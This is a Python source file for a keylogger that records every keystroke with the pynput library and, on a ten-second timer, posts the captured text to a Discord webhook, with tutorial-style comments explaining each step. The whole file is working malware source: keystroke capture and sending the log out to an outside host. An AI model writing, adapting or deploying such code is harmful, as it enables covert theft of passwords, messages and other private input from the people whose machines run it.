# Install pynput using the following command: pip install pynput
# Import the mouse and keynboard from pynput
from pynput import keyboard
# We need to import the requests library to Post the data to the server.
import requests
# To transform a Dictionary to a JSON string we need the json package.
import json
#  The Timer module is part of the threading package.
import threading
import os

# We make a global variable text where we'll save a string of the keystrokes which we'll send to the server.
text = ""

# Hard code the values of your server and ip address here.
ip_address = "  "
port_number = "8080"
# Time interval in seconds for code to execute.
time_interval = 10

print(os.getpid())

def send_to_discord():
    try: 
        webhook_url = "insert/discord/webhook"

        headers = {
            "Content-Type": "application/json"
        }

        data = {
            "content": text
        }

        response = requests.post(webhook_url, headers=headers, json=data)

        timer = threading.Timer(time_interval, send_to_discord)
            # We start the timer thread.
        timer.start()

        # if response.status_code == 200 or response.status_code == 204:
        #     print("\n\n[+] Log successfully sent to Discord.")
        # else:
        #     print(f"\n\n[+] Failed to send log to Discord. Status code: {response.status_code}, Response: {response.text}")
        
        # return response.status_code
    except:
        print("Couldn't complete request!")

# We only need to log the key once it is released. That way it takes the modifier keys into consideration.
def on_press(key):
    global text

# Based on the key press we handle the way the key gets logged to the in memory string.
# Read more on the different keys that can be logged here:
# https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
        text += str(key).strip("'")

# A keyboard listener is a threading.Thread, and a callback on_press will be invoked from this thread.
# In the on_press function we specified how to deal with the different inputs received by the listener.
with keyboard.Listener(
    on_press=on_press) as listener:
    # We start of by sending the post request to our server.
    send_to_discord()
    listener.join()
